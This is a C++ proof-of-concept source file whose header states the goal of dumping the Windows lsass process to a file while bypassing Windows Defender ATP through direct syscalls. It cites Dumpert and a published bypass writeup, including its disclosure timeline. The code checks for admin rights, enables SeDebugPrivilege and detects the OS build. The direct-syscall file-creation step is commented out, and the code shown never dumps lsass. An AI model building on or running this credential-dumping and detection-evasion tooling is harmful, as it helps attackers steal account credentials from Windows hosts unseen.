/*DirectCallPOC.cpp : POC built to see if we can dump lsass to a file and avoid WDATP by calling directly to the kernel using assembly stubs.  Since syscall codes are unique to each build
an implementation would have to account for all those differrences.  This concept leveraged from Dumpert (https://github.com/outflanknl/Dumpert) and portions of the code are modified from that codebase
as well as an excellent writeup at https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/.  

Disclosure timeline from @matteomalvica
02.11.2019: Notified MSRC about the bypass technique.
12.11.2019: Microsoft replied that WDATP bypass is not in scope for the bounty program. MSRC will perform analysis and ask for more information
20.11.2019: Solicited MSRC, got no feedback
27.11.2019: Solicited MSRC once more, got no feedback
02.12.2019: 30 days of non-disclose period over. Findings published

Building on this work this is an attempt to completely bypass ntdll to capture a snapshot of lsass.
1. Is x64
2. Must be admin
3. SeDebug()
4. Get PID
*/

#include "pch.h"
#include <iostream>
#include<Windows.h>
#include <stdio.h>
#include "DirectCallPOC.h"
#include <strsafe.h>
#include <intrin.h>
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")


//Because MS makes string handling a nighmare :)
#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

//Check credentials
BOOL IsElevated()
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize))
		{
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken)
	{
		CloseHandle(hToken);
	}
	return fRet;
}

//Get SeDebug

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = (LPWSTR)"SeDebugPrivilege";  //Taky but easy
	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

void ErrorExit(LPTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(dw);
}

int main()
{
	//We are after lsass
	LPCWSTR lpwProcName = L"lsass.exe";

	//Are we on a 64 bit OS
	if (sizeof(LPVOID) != 8)
	{
		wprintf(L"[!] This only works on x64 version of Windows. \n");
		exit(1);
	}

	//Are we Admin
	if (!IsElevated())
	{
		wprintf(L"[!]Elevated privliges are required to run this tool. \n");
	}

	SetDebugPrivilege();


	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));

	// First set OS Version/Architecture specific values
	OSVERSIONINFOEXW osInfo;
	LPWSTR lpOSVersion;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		return FALSE;
	}

	wprintf(L"[1] Checking OS version details:\n");
	RtlGetVersion(&osInfo);
	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;


	// Now create os/build specific syscall function pointers.
	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		lpOSVersion = (LPWSTR)"10 or Server 2016";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		lpOSVersion = (LPWSTR)"8.1 or Server 2012 R2";
		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo->dwBuildNumber);
	}
	else {
		wprintf(L"	[!] OS Version not supported.\n\n");
		exit(1);
	}

	wprintf(L"[2] Checking Process details:\n");

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);


	/*
	*******************Initial POC test stop here**************************
	

	//Alias NtCreateFile to our assembly code for this version of Windows 10
	NtCreateFile = &NtCreateFile10;
	
	//More string messy string handling
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");

	WCHAR FileName[50] = L"\\??\\C:\\Users\\Borg\\Desktop\\testing.bin";
	UNICODE_STRING uFileName;
	RtlInitUnicodeString(&uFileName, FileName);  //Finally a unicode string
	 
	//wprintf(L"	[+] Dump %wZ", uFileName);
	
	//Initialize the input/output variables for the call to CreateFile
	NTSTATUS status;
	HANDLE hDumpFile = NULL;
	IO_STATUS_BLOCK IoStatusBlock;
	ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
	OBJECT_ATTRIBUTES FileObjectAttributes;
	InitializeObjectAttributes (&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE	, NULL, NULL);

	//Call NtCreateFile and see if it works????
	status = NtCreateFile(&hDumpFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock,0 , FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE,FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	//Here we go again in MS string hell
	const wchar_t* FunctionNt = L"NtCreateFile10";
	LPTSTR LFunctionNt = (LPTSTR)FunctionNt;


	if ((hDumpFile == INVALID_HANDLE_VALUE) | (hDumpFile==0))
	{
		ErrorExit(LFunctionNt);
	} 

	char str[] = "Test string";
	DWORD bytesWritten;
	bool result = WriteFile(hDumpFile, str, strlen(str), &bytesWritten, NULL);


	//Here we go again in MS string hell
	const wchar_t* Function = L"WriteFile";
	LPTSTR LFunction = (LPTSTR)Function;

	if (!result)
	{
		ErrorExit(LFunction);
	}*/	

}



